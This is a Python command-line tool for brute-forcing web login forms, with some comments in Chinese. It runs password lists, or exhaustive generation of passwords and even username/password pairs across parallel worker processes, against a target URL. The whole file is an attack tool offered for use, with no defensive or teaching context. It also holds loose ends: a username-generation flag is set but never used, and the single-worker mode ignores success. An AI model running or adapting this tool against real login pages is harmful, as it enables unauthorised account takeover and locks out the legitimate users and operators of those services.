import argparse
import os
import string
import itertools
import math
from multiprocessing import Process, Manager
import sys
import time

def index_to_password(idx, charset, length):
    # Convert integer idx to a password string in the given charset
    base = len(charset)
    chars = []
    for _ in range(length):
        chars.append(charset[idx % base])
        idx //= base
    return ''.join(reversed(chars))

def password_range_generator(start, end, charset, length):
    # Generate all passwords from start to end-1
    for idx in range(start, end):
        yield index_to_password(idx, charset, length)

def username_range_generator(start, end, charset, length):
    # Generate all usernames from start to end-1
    for idx in range(start, end):
        yield index_to_password(idx, charset, length)

def print_progress(current, total, start_time):
    # Print progress bar for CLI
    percent = (current / total) * 100 if total else 0
    elapsed = time.time() - start_time
    eta = (elapsed / current) * (total - current) if current else 0
    msg = f'Progress: {current}/{total} ({percent:.2f}%), Elapsed: {elapsed:.1f}s, ETA: {eta:.1f}s'
    print(msg, end='\r', flush=True)

def worker_list_mode(sublist, args, found_flag, progress_dict, worker_id):
    from .auto_brute import brute_force
    total = len(sublist)
    start_time = time.time()
    for idx, pw in enumerate(sublist):
        if found_flag.value:
            break
        result = brute_force(
            url=args.url,
            username=args.username,
            password_list=[pw],
            delay=args.delay,
            success_url=args.success_url,
            verbose=True
        )
        progress_dict[worker_id] = idx + 1
        if result:
            found_flag.value = True
            break
        print_progress(sum(progress_dict.values()), progress_dict['total'], start_time)

def worker_gen_mode(start, end, charset, pw_length, args, found_flag, progress_dict, worker_id):
    from .auto_brute import brute_force
    pw_gen = password_range_generator(start, end, charset, pw_length)
    total = end - start
    start_time = time.time()
    for idx, pw in enumerate(pw_gen):
        if found_flag.value:
            break
        result = brute_force(
            url=args.url,
            username=args.username,
            password_list=[pw],
            delay=args.delay,
            success_url=args.success_url,
            verbose=True
        )
        progress_dict[worker_id] = idx + 1
        if result:
            found_flag.value = True
            break
        print_progress(sum(progress_dict.values()), progress_dict['total'], start_time)

def worker_both_mode(start, end, charset, un_length, pw_length, args, found_flag, progress_dict, worker_id):
    from .auto_brute import brute_force
    total = end - start
    start_time = time.time()
    for idx in range(start, end):
        if found_flag.value:
            break
        uname_idx = idx // (len(charset) ** pw_length)
        pwd_idx = idx % (len(charset) ** pw_length)
        uname = index_to_password(uname_idx, charset, un_length)
        pwd = index_to_password(pwd_idx, charset, pw_length)
        result = brute_force(
            url=args.url,
            username=uname,
            password_list=[pwd],
            delay=args.delay,
            success_url=args.success_url,
            verbose=True
        )
        progress_dict[worker_id] = idx - start + 1
        if result:
            found_flag.value = True
            break
        print_progress(sum(progress_dict.values()), progress_dict['total'], start_time)

def main():
    parser = argparse.ArgumentParser(description="Auto password brute force for web login forms.")
    parser.add_argument('url', help='Login page URL')
    parser.add_argument('--username', help='Username to try (optional)', default=None)
    parser.add_argument('--passwords', help='Password list file (optional) or comma-separated passwords')
    parser.add_argument('--delay', type=int, default=2, help='Delay between attempts (seconds)')
    parser.add_argument('--success_url', help='URL after successful login (optional)')
    parser.add_argument('--workers', type=int, default=1, help='Number of parallel browser windows (default: 1)')
    parser.add_argument('--max-length', type=int, default=4, help='Max password length for auto generation (default: 4, max: 20)')
    args = parser.parse_args()

    # 判斷模式：
    # 1. username only: auto-generate password (現有)
    # 2. password only: auto-generate username (現有)
    # 3. both: normal
    # 4. neither: auto-generate all username/password combinations (新功能)

    if args.username and not args.passwords:
        # username only: auto-generate password (現有)
        is_gen_password = True
        is_gen_username = False
        is_gen_both = False
    elif args.passwords and not args.username:
        # password only: auto-generate username (現有)
        is_gen_password = False
        is_gen_username = True
        is_gen_both = False
    elif not args.username and not args.passwords:
        # both missing: auto-generate all username/password combinations (新功能)
        is_gen_password = False
        is_gen_username = False
        is_gen_both = True
    else:
        is_gen_password = False
        is_gen_username = False
        is_gen_both = False

    if is_gen_both:
        # 完全自動產生所有 username/password 組合
        max_length = min(args.max_length, 20)
        charset = string.ascii_letters + string.digits + string.punctuation
        with Manager() as manager:
            found_flag = manager.Value('b', False)
            for un_length in range(max_length, 0, -1):
                for pw_length in range(max_length, 0, -1):
                    if found_flag.value:
                        break
                    print(f"[INFO] Trying all username/password combinations: username length {un_length}, password length {pw_length}...")
                    total = (len(charset) ** un_length) * (len(charset) ** pw_length)
                    chunk_size = total // args.workers
                    processes = []
                    progress_dict = manager.dict()
                    progress_dict['total'] = total
                    for i in range(args.workers):
                        start = i * chunk_size
                        end = (i+1) * chunk_size if i < args.workers - 1 else total
                        progress_dict[i] = 0
                        p = Process(target=worker_both_mode, args=(start, end, charset, un_length, pw_length, args, found_flag, progress_dict, i))
                        p.start()
                        processes.append(p)
                    for p in processes:
                        p.join()
                    if found_flag.value:
                        print(f"[INFO] Username/password found at username length {un_length}, password length {pw_length}, stopping further attempts.")
                        break
            else:
                print("[INFO] All username/password combinations tried, no login succeeded.")
        return

    password_list = None
    charset = string.ascii_letters + string.digits + string.punctuation
    max_pw_length = min(args.max_length, 20)

    if args.passwords:
        # Try to treat --passwords as a file path first
        if os.path.isfile(args.passwords):
            with open(args.passwords, encoding='utf-8') as f:
                password_list = [line.strip() for line in f if line.strip()]
        else:
            # If file does not exist, treat as direct password string (support comma separated)
            # If user provides --passwords "Password123,abc123", split by comma
            password_list = [pw.strip() for pw in args.passwords.split(',') if pw.strip()]
        is_generator = False
    else:
        # Check if default_passwords/password.txt exists
        pwd_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'default_passwords', 'password.txt')
        if os.path.exists(pwd_path):
            with open(pwd_path, encoding='utf-8') as f:
                password_list = [line.strip() for line in f if line.strip()]
            is_generator = False
        else:
            # Dynamically generate passwords up to pw_length
            is_generator = True

    if not is_generator:
        # list mode
        if args.workers == 1:
            from .auto_brute import brute_force
            total = len(password_list)
            start_time = time.time()
            for idx, pwd in enumerate(password_list):
                print_progress(idx+1, total, start_time)
                brute_force(
                    url=args.url,
                    username=args.username,
                    password_list=[pwd],
                    delay=args.delay,
                    success_url=args.success_url,
                    verbose=True
                )
            print()  # Newline after progress
        else:
            chunk_size = math.ceil(len(password_list) / args.workers)
            processes = []
            with Manager() as manager:
                found_flag = manager.Value('b', False)
                progress_dict = manager.dict()
                progress_dict['total'] = len(password_list)
                for i in range(args.workers):
                    sublist = password_list[i*chunk_size:(i+1)*chunk_size]
                    progress_dict[i] = 0
                    p = Process(target=worker_list_mode, args=(sublist, args, found_flag, progress_dict, i))
                    p.start()
                    processes.append(p)
                for p in processes:
                    p.join()
    else:
        # Auto-generate passwords, try from max_pw_length down to 1
        with Manager() as manager:
            found_flag = manager.Value('b', False)
            for pw_length in range(max_pw_length, 0, -1):
                if found_flag.value:
                    break
                print(f"[INFO] Trying all passwords of length {pw_length}...")
                total = len(charset) ** pw_length
                chunk_size = total // args.workers
                processes = []
                progress_dict = manager.dict()
                progress_dict['total'] = total
                for i in range(args.workers):
                    start = i * chunk_size
                    end = (i+1) * chunk_size if i < args.workers - 1 else total
                    progress_dict[i] = 0
                    p = Process(target=worker_gen_mode, args=(start, end, charset, pw_length, args, found_flag, progress_dict, i))
                    p.start()
                    processes.append(p)
                for p in processes:
                    p.join()
                if found_flag.value:
                    print(f"[INFO] Password found at length {pw_length}, stopping further attempts.")
                    break
            else:
                print("[INFO] All lengths tried, no password found.")

if __name__ == '__main__':
    main()